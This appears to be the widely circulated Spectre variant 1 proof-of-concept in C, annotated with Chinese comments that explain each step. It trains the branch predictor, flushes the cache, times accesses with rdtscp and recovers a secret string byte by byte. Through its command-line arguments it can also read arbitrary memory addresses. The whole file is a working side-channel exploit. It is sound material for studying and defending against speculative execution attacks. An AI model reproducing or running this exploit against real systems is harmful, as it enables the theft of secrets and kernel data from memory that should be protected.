#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif


unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0;

void victim_function(size_t x)
{
	//array1_size=16
	//x将会是连续固定符合要求的值，然后是一个恶意的地址
	//恶意的地址由于分支预测的问题，将会被执行
	if (x < array1_size)
	{
		//恶意的地址在开始时是按照相对于array1的起始地址给的
		//array1[x]的范围仍旧是0-255，将这个值作为索引乘以512，访问array2
		temp &= array2[array1[x] * 512];
	}
}



#define CACHE_HIT_THRESHOLD (80)


void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;//unsigned int
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (i = 0; i < 256; i++)
		//用于纪录探测结果的数组
		results[i] = 0;

	//尝试次数，1000次，最后统计hit/miss的次数
	for (tries = 999; tries > 0; tries--)
	{
		for (i = 0; i < 256; i++)
			//清空用于探测的数组在cache中的元素
			_mm_clflush(&array2[i * 512]);
		
		//array1 size = 16
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			//将array1_size从cache中清除，以减慢victim中分支的执行
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++) {}//Delay (can also mfence)
               //每六次，五次为training_x用作训练，一次为malicious_x用作攻击 
			x = ((j % 6) - 1) & ~0xFFFF;//如果j%6==0 x=0xffff0000 否则 x=0 
			x = (x | (x >> 16));        //j%6==0时 x=0xffffffff 否则 x=0 
			x = training_x ^ (x & (malicious_x ^ training_x));//如果j%6==0,x=malicious_x or training_x 
			//x的结果为,部分满足分支条件，然后使用内核地址访问，此时分支预测器会认为是要执行的，此时就会出现问题
			
			victim_function(x);
		}

		//根据cache更改之后的状态统计array2中哪些数据被放入到了cache中
		//根据这些数据对应的索引，则可以计算得到实际访问到的内核数据
		for (i = 0; i < 256; i++)
		{
			//mix_i仍旧是0-255的数字，但是顺序被打乱，防止分支预测影响结果
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp((unsigned int*)&junk);
			junk = *addr;
			time2 = __rdtscp((unsigned int*)&junk) - time1;
			//命中时，有两个命中的情况，一个是train_x作为下标，一个是malicious_x，要忽略train_x的情况 
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++;
		}

		j = k = -1;
		//寻找results中的最大值和次大值
		//最大值意味着hit的次数最多，即可能性最大
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		//如果最大值比次大值大很多，则意味着会很准确，可以跳出执行
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break;
			//如果最大值为2，次大值为0，就直接跳出，可以节省时间。 
	}
	results[0] ^= junk;
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

//malicious 恶意的
int main(int argc, const char **argv)
{
	//将绝对地址转换为相对地址，因为之后是作为array1的索引使用
	size_t malicious_x=(size_t)(secret-(char*)array1);
	
	int i, score[2], len=40;
	uint8_t value[2];

	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1;
	if (argc == 3)
	{
		//可以探测任意内存位置的值 
		sscanf(argv[1], "%x", (void**)(&malicious_x));
		//将绝对地址转换为相对地址，因为之后是作为array1的索引使用
		malicious_x -= (size_t)array1;
		sscanf(argv[2], "%d", &len);
	}

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2*score[1] ? "Success":"Unclear"));
		printf("0x%02X=%c,score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
	}
	return (0);
}

